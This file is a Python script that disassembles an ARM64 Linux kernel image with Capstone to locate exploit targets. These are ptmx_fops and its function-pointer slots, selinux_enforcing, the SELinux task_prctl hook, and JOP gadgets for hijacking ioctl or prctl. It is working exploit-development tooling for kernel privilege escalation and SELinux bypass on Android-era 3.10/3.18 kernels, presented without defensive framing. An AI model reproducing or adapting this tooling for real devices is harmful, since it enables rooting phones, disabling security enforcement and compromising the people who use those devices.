#!/usr/bin/env python
# -*- coding: utf-8 -*-

import sys,os
from capstone import *
from capstone.arm64 import *
import subprocess
import struct

KERNEL_START = 0xffffffc000080000

reg_dict = {ARM64_REG_X0:"X0",
            ARM64_REG_X1:"X1",
            ARM64_REG_X2:"X2",
            ARM64_REG_X3:"X3",
            ARM64_REG_X4:"X4",
            ARM64_REG_X5:"X5"
}


def print_bytes(insn):
    return ''.join("%02x%02x%02x%02x" % (insn.bytes[3], insn.bytes[2], insn.bytes[1], insn.bytes[0]))


def get_function_index(contents, name, partial = False):

    result = -1
    index = 0
    length = len(contents)

    while index < length:
        line = contents[index].strip().split(' ')
        if partial:
            if line[2].startswith(name):
                result = index
                break
        else:
            if line[2] == name:
                result = index
                break
        index += 1

    return result

def get_address_post(name, partial = False):

    result = 0

    f = open("kallsyms.out", "r")
    contents = f.readlines()
    f.close()

    index = get_function_index(contents, name, partial)
    if index >= 0:
        address = contents[index].strip().split(' ')[0]
        index += 1
        next_address = contents[index].strip().split(' ')[0]
        # 跳过重复地址
        while next_address == address:
            index += 1
            next_address = contents[index].strip().split(' ')[0]

        result = int(next_address, 16)

    return result

def get_address(name, partial = False):

    result = 0

    f = open("kallsyms.out", "r")
    contents = f.readlines()
    f.close()
    index = get_function_index(contents, name, partial)
    if index >= 0:
        address = contents[index].strip().split(' ')[0]
        result = int(address, 16)

    return result

def get_functon_info(function, partial = False):
    func_address = get_address(function, partial)
    offset = func_address - KERNEL_START
    size = get_address_post(function, partial) - func_address

    return (func_address, size, offset)


def find_ptmx_fops(kernel):

    print "+++++ find ptmx_fops address ..."
    address = 0
    func_address, size, offset = get_functon_info("pty_init")

    md = Cs(CS_ARCH_ARM64, CS_MODE_ARM)
    md.detail = True

    insns = []
    for i in md.disasm(kernel[offset:offset + size], func_address):
        insns.append(i)

    reg1 = -1
    reg2 = -1
    reg3 = -1
    add1 = 0
    add2 = 0
    count = len(insns) - 1

    # 反向查找指令
    while count >= 0:
        insn = insns[count]
        #print("0x%x:\t%s\t%s\t%s" % (insn.address, print_bytes(insn), insn.mnemonic, insn.op_str))
        if insn.id == ARM64_INS_BL:
            tty_default_fops = "0x{:0x}".format(get_address("tty_default_fops"))
            if tty_default_fops in insn.op_str:
                #print("0x%x:\t%s\t%s\t%s" % (insn.address, print_bytes(insn), insn.mnemonic, insn.op_str))
                break
        count -= 1


    while count >= 0:
        insn = insns[count]
        # mov x0, xA
        if reg1 == -1 and insn.id == ARM64_INS_MOV:
            op1, op2 = insn.operands
            #print op1, op2
            if op1.type == ARM64_OP_REG and op2.type == ARM64_OP_REG:
                if op1.reg == ARM64_REG_X0:
                    reg1 = op2.reg
                    print "REG1 = %s" % insn.reg_name(reg1)
        # add xA, xB, #?
        elif reg2 == -1 and insn.id == ARM64_INS_ADD and len(insn.operands) == 3:
            op1, op2, op3 = insn.operands
            if op1.type == ARM64_OP_REG and op2.type == ARM64_OP_REG \
               and op3.type == ARM64_OP_IMM:
                if op1.reg == reg1:
                    reg2 = op2.reg
                    add1 = op3.imm
                    print "REG2 = %s, imm1 = %d" % (insn.reg_name(reg2), op3.imm)
        # add xB, x?, #?
        elif reg3 == -1 and insn.id == ARM64_INS_ADD and len(insn.operands) == 3:
            op1, op2, op3 = insn.operands
            if op1.type == ARM64_OP_REG and op2.type == ARM64_OP_REG \
               and op3.type == ARM64_OP_IMM:
                if op1.reg == reg2:
                    reg3 = op2.reg
                    add2 = op3.imm
                    print "REG3 = %s, imm2 = %d" % (insn.reg_name(reg2), op3.imm)
        # adrp xB, #?
        elif insn.id == ARM64_INS_ADRP and len(insn.operands) == 2:
            op1, op2 = insn.operands
            if op1.type == ARM64_OP_REG and op2.type == ARM64_OP_IMM:
                if op1.reg == reg3:
                    #print "op string = %s" % insn.op_str
                    idx = insn.op_str.find("#")
                    address = int(insn.op_str[idx+3:], 16) + add1 + add2
                    break
        count -= 1

    return address

def find_unlocked_ioctl(kernel):

    print "+++++ find unlocked_ioctl offset from struct file_operations"
    result = 0

    func_address, size, offset = get_functon_info("compat_ion_ioctl")

    md = Cs(CS_ARCH_ARM64, CS_MODE_ARM)
    md.detail = True

    insns = []
    for i in md.disasm(kernel[offset:offset + size], func_address):
        insns.append(i)

    count = 0
    find = 0
    while count < len(insns):
        insn = insns[count]
        if insn.id == ARM64_INS_CBZ:
            find += 1
            if find == 2 and insns[count - 1].id == ARM64_INS_LDR and len(insns[count - 1].operands) == 2:
                op1, op2 = insns[count - 1].operands
                if op2.type == ARM64_OP_MEM:
                    result = op2.mem.disp
                    print "unlocked_ioctl offset = %x" % result
                    break
        count += 1

    return result
                

def find_task_prctl(kernel):

    print "+++++ find task_prctl address ..."
    address = 0
    func_address, size, offset = get_functon_info("selinux_init")

    md = Cs(CS_ARCH_ARM64, CS_MODE_ARM)
    md.detail = True

    insns = []
    for i in md.disasm(kernel[offset:offset + size], func_address):
        insns.append(i)

    reg1 = -1
    reg2 = -1
    reg3 = -1
    add1 = 0
    add2 = 0
    count = len(insns) - 1
    reg_last = -1

    # 反向查找指令
    while count >= 0:
        insn = insns[count]
        #print("0x%x:\t%s\t%s\t%s" % (insn.address, print_bytes(insn), insn.mnemonic, insn.op_str))
        if insn.id == ARM64_INS_BL:
            security_fixup_ops = "0x{:0x}".format(get_address("security_module_enable"))
            if security_fixup_ops in insn.op_str:
                #print("0x%x:\t%s\t%s\t%s" % (insn.address, print_bytes(insn), insn.mnemonic, insn.op_str))
                break
        count -= 1


    while count >= 0:
        insn = insns[count]
        # mov x0, xA
        if reg1 == -1 and insn.id == ARM64_INS_MOV:
            op1, op2 = insn.operands
            #print op1, op2
            if op1.type == ARM64_OP_REG and op1.reg == ARM64_REG_X0 and op2.type == ARM64_OP_REG:
                reg1 = op2.reg
                print "REG1 = %s" % insn.reg_name(reg1)
        # add xA, xB, #?
        elif reg2 == -1 and insn.id == ARM64_INS_ADD and len(insn.operands) == 3:
            op1, op2, op3 = insn.operands
            if op1.type == ARM64_OP_REG and op2.type == ARM64_OP_REG \
               and op3.type == ARM64_OP_IMM:
                if op1.reg == reg1:
                    reg2 = op2.reg
                    add1 = op3.imm
                    reg_last = reg2
                    print "REG2 = %s, imm1 = %d" % (insn.reg_name(reg2), op3.imm)

         # add xA, xB, #?
        elif reg3 == -1 and insn.id == ARM64_INS_ADD and len(insn.operands) == 3:
            op1, op2, op3 = insn.operands
            if op1.type == ARM64_OP_REG and op2.type == ARM64_OP_REG \
               and op3.type == ARM64_OP_IMM:
                if op1.reg == reg2:
                    reg3 = op2.reg
                    add2 = op3.imm
                    reg_last = reg3
                    print "REG3 = %s, imm1 = %d" % (insn.reg_name(reg3), op3.imm)

        # adrp xB, #?
        elif insn.id == ARM64_INS_ADRP and len(insn.operands) == 2:
            op1, op2 = insn.operands
            if op1.type == ARM64_OP_REG and op2.type == ARM64_OP_IMM:
                if op1.reg == reg_last:
                    #print "op string = %s" % insn.op_str
                    idx = insn.op_str.find("#")
                    address = int(insn.op_str[idx+3:], 16) + add1 + add2
                    break
        count -= 1
    # CONFIG_SECURITY_PATH

    offset = 0
    base = address - KERNEL_START

    task_wait = get_address('selinux_task_wait')
    file_ioctl = get_address('selinux_file_ioctl')
    value = struct.unpack_from("<Q", kernel, base + offset)[0]
    while value != task_wait:
        offset += 8
        value = struct.unpack_from("<Q", kernel, base + offset)[0]
        if value == file_ioctl:
            print "file_ioclt = %x" % (address + offset)

    print "task_prctl offset of selinux_ops= %x" % (offset + 8)
    return address + offset + 8

def find_selinux_enforcing(kernel):

    print "+++++ find selinux_enforcing address ..."
    address = 0
    func_address, size, offset = get_functon_info("enforcing_setup")

    md = Cs(CS_ARCH_ARM64, CS_MODE_ARM)
    md.detail = True

    insns = []
    for i in md.disasm(kernel[offset:offset + size], func_address):
        insns.append(i)
    count = len(insns) - 1

    index = 0
    reg = -1

    while index < count:
        insn = insns[index]
        #print "len of operands = %d" % len(insn.operands)
        if reg == -1 and insn.id == ARM64_INS_ADRP and len(insn.operands) == 2:
            op1, op2 = insn.operands
            if op1.type == ARM64_OP_REG and op2.type == ARM64_OP_IMM:
                #print "adrp address = %x" % insn.address
                reg = op1.reg
                idx = insn.op_str.find("#")
                address = int(insn.op_str[idx + 3:], 16)
        elif reg != -1 and insn.id == ARM64_INS_LDR and len(insn.operands) == 2:
            op1, op2 = insn.operands
            if op1.type == ARM64_OP_REG and op1.reg == ARM64_REG_X0 and op2.type == ARM64_OP_MEM:
                #print "data area offset = %x" % op2.mem.disp
                data_offset = address - KERNEL_START + op2.mem.disp
                address = struct.unpack_from("<Q", kernel, data_offset)[0]
        elif insn.id == ARM64_INS_STR and len(insn.operands) == 2:
            op1, op2 = insn.operands
            if op1.type == ARM64_OP_REG and op2.type == ARM64_OP_MEM:
                #print "base = %x, index = %x, disp = %x" % (op2.mem.base, op2.mem.index, op2.mem.disp)
                address += op2.mem.disp
                break

        index += 1

    return address


def find_gadget_1_310(kernel):
    print "+++++ find gadget 1 ..."
    address = 0
    func_address, size, offset = get_functon_info("locks_remove_posix")

    md = Cs(CS_ARCH_ARM64, CS_MODE_ARM)
    md.detail = True

    insns = []
    for i in md.disasm(kernel[offset:offset + size], func_address):
        insns.append(i)
    count = len(insns) - 1

    index = 0
    while index < count:
        if insns[index].id == ARM64_INS_LDR and insns[index + 1].id == ARM64_INS_CBZ \
            and insns[index + 2].id == ARM64_INS_ADD and insns[index + 3].id == ARM64_INS_BLR:
            address = insns[index].address
            print "gadget1 address = %x" % address
            break
        index += 1

    return address


def find_gadget_2_310(kernel):
    print "+++++ find gadget 2 ..."
    address = 0
    func_address, size, offset = get_functon_info("SyS_fcntl")

    md = Cs(CS_ARCH_ARM64, CS_MODE_ARM)
    md.detail = True

    insns = []
    for i in md.disasm(kernel[offset:offset + size], func_address):
        insns.append(i)
    count = len(insns) - 1

    index = 0
    while index < count:
        if (insns[index].id == ARM64_INS_LDR and insns[index + 1].id == ARM64_INS_CBZ \
           and insns[index + 2].id == ARM64_INS_MOV and insns[index + 3].id == ARM64_INS_BLR) \
           and (insns[index + 4].id == ARM64_INS_CBNZ or insns[index + 4].id == ARM64_INS_SXTW):
            address = insns[index + 4].address
            print "gadget2 address = %x" % address
            break
        index += 1

    return address

def find_check_flags(kernel):
    print "+++++ get check_flags offset from ptmx_fops"

    result = 0
    func_address, size, offset = get_functon_info("SyS_fcntl")

    md = Cs(CS_ARCH_ARM64, CS_MODE_ARM)
    md.detail = True

    insns = []
    for i in md.disasm(kernel[offset:offset + size], func_address):
        insns.append(i)
    count = len(insns) - 1

    index = 0
    while index < count:
        if (insns[index].id == ARM64_INS_LDR) and \
           (insns[index + 1].id == ARM64_INS_CBZ or insns[index + 1].id == ARM64_INS_CBNZ):
            insn = insns[index]
            #print "insn operands len = %d" % len(insn.operands)
            op1, op2 = insn.operands
            #print "op1 type = %d, op2 type =%d" % (op1.type, op2.type)
            if op1.type ==  ARM64_OP_REG and op1.reg == ARM64_REG_X1 and op2.type == ARM64_OP_MEM \
               and op2.mem.base == ARM64_REG_X0:
                #print "base = %d, index = %d, disp = %d" % (op2.mem.base, op2.mem.index, op2.mem.disp)
                result = op2.mem.disp
                print "check_flags offset = 0x%x" % result
                break
        index += 1

    return result


def find_gadget_1_318(kernel):
    print "+++++ find gadget 1 ..."
    address = 0
    func_address, size, offset = get_functon_info("locks_remove_posix.part", True)

    md = Cs(CS_ARCH_ARM64, CS_MODE_ARM)
    md.detail = True

    insns = []
    for i in md.disasm(kernel[offset:offset + size], func_address):
        insns.append(i)
    count = len(insns) - 1

    index = 0
    while index < count:
        if insns[index].id == ARM64_INS_LDR and insns[index + 1].id == ARM64_INS_CBZ \
           and insns[index + 2].id == ARM64_INS_ADD and insns[index + 3].id == ARM64_INS_BLR:
            address = insns[index].address
            print "gadget1 address = %x" % address
            break
        index += 1

    return address


def find_gadget_2_318(kernel):
    print "+++++ find gadget 2 ..."
    address = 0
    func_address, size, offset = get_functon_info("SyS_fcntl")

    md = Cs(CS_ARCH_ARM64, CS_MODE_ARM)
    md.detail = True

    insns = []
    for i in md.disasm(kernel[offset:offset + size], func_address):
        insns.append(i)
    count = len(insns) - 1

    index = 0
    while index < count:
        if insns[index].id == ARM64_INS_MOV and insns[index + 1].id == ARM64_INS_BLR:
            if (insns[index + 2].id == ARM64_INS_SXTW and insns[index + 3].id == ARM64_INS_CBNZ) or \
               (insns[index + 2].id == ARM64_INS_CBZ and insns[index + 3].id == ARM64_INS_SXTW):
                address = insns[index + 2].address
                print "gadget2 address = %x" % address
                break
        index += 1

    return address


def find_jop_read(kernel, hijack="ioctl"):
    
    print "+++++ find jop_read, type: %s" % hijack
    if hijack == "ioctl":
        reg_in = ARM64_REG_X2
        reg_out = ARM64_REG_X1
    elif hijack == "prctl":
        reg_in = ARM64_REG_X1
        reg_out = ARM64_REG_X0

    md = Cs(CS_ARCH_ARM64, CS_MODE_ARM)
    md.detail = True
    md.skipdata = True

    insns = []
    for i in md.disasm(kernel, KERNEL_START):
        insns.append(i)
    count = len(insns) - 1
    index = 0

    print "input reg: %s, output reg: %s" % (reg_dict[reg_in], reg_dict[reg_out])

    gadgets = []
    while index < count - 2:
        insn1 = insns[index]
        insn2 = insns[index + 1]
        insn3 = insns[index + 2]
        if insn1.id == ARM64_INS_LDR and insn2.id == ARM64_INS_STR and insn3.id == ARM64_INS_RET:
            length1 = len(insn1.operands)
            length2 = len(insn2.operands)
            if length1 == 2 and length2 == 2:
                insn1_op1, insn1_op2 = insn1.operands
                insn2_op1, insn2_op2 = insn2.operands
                if insn1_op2.type == ARM64_OP_MEM and insn2_op2.type == ARM64_OP_MEM \
                   and insn1_op1.type == ARM64_OP_REG and insn2_op1.type == ARM64_OP_REG \
                   and insn1_op1.reg == insn2_op1.reg and insn1_op1.reg >= ARM64_REG_X0:
                    if insn1_op2.mem.base == reg_in and insn2_op2.mem.base == reg_out:
                        print "#########################################################"
                        print "%016x\t%s\t%s" %(insn1.address, insn1.mnemonic, insn1.op_str)
                        print "%016x\t%s\t%s" %(insn2.address, insn2.mnemonic, insn2.op_str)
                        print "%016x\t%s\t%s" %(insn3.address, insn3.mnemonic, insn3.op_str)
                        gadget = []
                        reg_in_offset = insn1_op2.mem.disp
                        reg_out_offset = insn2_op2.mem.disp
                        gadget.append(reg_in_offset)
                        gadget.append(reg_out_offset)
                        gadget.append(insn1.address)
                        gadgets.append(gadget)

        index += 1

    print "Done!"
    print gadgets
    

if __name__ == "__main__":

    if len(sys.argv) < 2:
        print "usage: %s <kernel image>" % sys.argv[0]
        sys.exit(0)


    ptmx_fops = 0
    selinux_enforcing = 0
    gadget1 = 0
    gadget2 = 0
    check_flags_offset = 0

    print "+++++ get kernel symbols from kernel Image ..."
    ret = subprocess.call("./static_kallsyms-arm64.py %s" % sys.argv[1], shell=True)
    if (ret == 0):
        f = open(sys.argv[1], "rb")
        kernel = f.read()

        '''
        check_flags_offset = find_check_flags(kernel)
        unlocked_ioctl_offset = find_unlocked_ioctl(kernel)
        ptmx_fops = find_ptmx_fops(kernel)
        #print "ptmx_fops = 0x%x" % ptmx_fops
        task_prctl = find_task_prctl(kernel)
        cap_task_prctl = get_address('cap_task_prctl')
        selinux_enforcing = find_selinux_enforcing(kernel)
        #print "selinux_enforcing = 0x%x" % selinux_enforcing
        index = kernel.find("Linux version 3.1")
        version = struct.unpack_from("<23s", kernel, index)[0]
        #print "kernel Version: %s" % version
        if version.find("Linux version 3.10") != -1:
            gadget1 = find_gadget_1_310(kernel)
            gadget2 = find_gadget_2_310(kernel)
        elif version.find("Linux version 3.18") != -1:
            gadget1 = find_gadget_1_318(kernel)
            gadget2 = find_gadget_2_318(kernel)
        else:
            print "Linux version Unknow, is this really a kernel Image ?"

        print ""
        print "****************************************************************"
        print "ptmx_fops:              {:>30}".format("0x%x" % ptmx_fops)
        print "ptmx_fops->check_flags: {:>30}".format("0x%x" % (ptmx_fops + check_flags_offset))
        print "ptmx_fops->unlocked_ioctl:{:>30}".format("0x%x" % (ptmx_fops + unlocked_ioctl_offset))
        print "gadget1:                {:>30}".format("0x%x" % gadget1)
        print "gadget2:                {:>30}".format("0x%x" % gadget2)
        print "selinux_enforcing:      {:>30}".format("0x%x" % selinux_enforcing)
        print "task_prctl:             {:>30}".format("0x%x" % task_prctl)
        print "cap_task_prctl:         {:>30}".format("0x%x" % cap_task_prctl)
        print "****************************************************************"
        '''
        find_jop_read(kernel)

